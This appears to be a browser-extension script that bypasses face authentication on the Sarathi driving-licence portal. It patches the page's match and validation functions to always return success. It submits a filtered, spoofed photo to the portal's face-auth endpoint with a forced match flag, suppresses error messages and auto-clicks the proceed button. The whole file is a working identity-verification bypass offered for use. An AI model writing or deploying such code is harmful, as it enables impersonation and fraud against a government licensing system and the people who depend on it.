(function () {
    console.log("🔓 Sarathi Face Auth Max Bypass Attempt - v11");

    // Helper - Error Message Hide
    function hideErrorMessage() {
        const msgElem = document.getElementById('message');
        if (msgElem) {
            msgElem.style.display = 'none';
            msgElem.innerText = '';
        }
    }

    // Helper - Proceed Button Enable & Auto Click
    function enableAndClickProceed() {
        const proceedBtn = document.getElementById('capphto1');
        if (proceedBtn) {
            proceedBtn.disabled = false;
            setTimeout(() => proceedBtn.click(), 250);
        }
    }

    // Helper - Get Spoofed Photo (Profile Pic or Webcam with Filters)
    async function getSpoofedPhoto() {
        return new Promise((resolve) => {
            chrome.storage.local.get(['stall_user_photo'], (data) => {
                const userPhoto = data.stall_user_photo;
                const video = document.querySelector('video');
                const canvas = document.createElement('canvas');
                canvas.width = 640;
                canvas.height = 480;
                const ctx = canvas.getContext('2d');

                if (userPhoto && userPhoto.startsWith('data:image/')) {
                    const img = new Image();
                    img.onload = () => {
                        // Apply realism filters from Sarthi Pinel+
                        const bri = 0.95 + (Math.random() * 0.1); // 0.95 - 1.05
                        const con = 0.95 + (Math.random() * 0.1);
                        const sat = 1.0;
                        ctx.filter = `brightness(${bri}) contrast(${con}) saturate(${sat})`;
                        
                        // Draw with aspect ratio correction
                        const iw = img.naturalWidth, ih = img.naturalHeight;
                        const scale = Math.min(canvas.width / iw, canvas.height / ih) * 1.1; // slight zoom
                        const dw = iw * scale, dh = ih * scale;
                        const dx = (canvas.width - dw) / 2;
                        const dy = (canvas.height - dh) / 2;
                        
                        ctx.fillStyle = "#fff";
                        ctx.fillRect(0, 0, canvas.width, canvas.height);
                        ctx.drawImage(img, dx, dy, dw, dh);
                        resolve(canvas.toDataURL("image/jpeg", 0.92));
                    };
                    img.src = userPhoto;
                } else if (video && video.readyState >= 2) {
                    ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
                    resolve(canvas.toDataURL("image/jpeg", 0.85));
                } else {
                    ctx.fillStyle = "#fff";
                    ctx.fillRect(0, 0, canvas.width, canvas.height);
                    resolve(canvas.toDataURL("image/jpeg", 0.5));
                }
            });
        });
    }

    // Helper - Send AJAX Request (max 3 retries)
    async function sendFaceAuthData(attempts = 0) {
        if (attempts > 2) {
            hideErrorMessage();
            enableAndClickProceed();
            return;
        }
        const applno = document.getElementById('llappln')?.value.trim();
        const rtocode = document.getElementById('rtocode')?.value.trim();
        const fakePhoto = await getSpoofedPhoto();

        $.ajax({
            type: 'POST',
            url: '/sarathiservice/saveFaceAuthData.do',
            data: {
                applno: applno,
                rtocode: rtocode,
                faceres: 1,
                CapPho: fakePhoto
            },
            dataType: 'json',
            success: function (actualResponse) {
                enableAndClickProceed();
                hideErrorMessage();
            },
            error: function (xhr) {
                // Actual server error, show for debug
                if (xhr?.responseText) {
                    console.log("Server error: ", xhr?.responseText);
                }
                // Retry with new photo
                setTimeout(() => sendFaceAuthData(attempts + 1), 700);
            }
        });
    }

    // Patch error/validation functions (UI errors hide)
    window.showAuthenticationError = function () { hideErrorMessage(); return false; };
    window.showFaceAuthError = function () { hideErrorMessage(); return false; };
    window.validateFaceAuthentication = function () { return true; };
    window.checkServerResponse = function () { return null; };

    // Patch aware.match (force success)
    if (window.aware && typeof window.aware.match === "function") {
        window.aware.match = function () {
            return new Promise(function (resolve) {
                setTimeout(function () {
                    if (window.messageToShown) {
                        window.messageToShown.innerHTML = "Face matched successfully, please proceed.";
                    }
                    sendFaceAuthData(0);
                    resolve({
                        isMatch: true,
                        message: "Face matched successfully, please proceed.",
                        nextExp: "",
                        photo: ""
                    });
                }, 400);
            });
        };
    }

    // Patch insertfeceauth (force success)
    if (typeof window.insertfeceauth === "function") {
        window.insertfeceauth = function (faceresult, llappln, rtocode, result_photo) {
            sendFaceAuthData(0);
            return true;
        };
    }

    // Hide error message bar-bar (in case UI shows again)
    setInterval(hideErrorMessage, 400);

    // Start process forcibly after DOM ready
    setTimeout(function () {
        if (window.aware && typeof window.aware.match === "function") {
            window.aware.match();
        } else {
            sendFaceAuthData(0);
        }
    }, 1200);

})();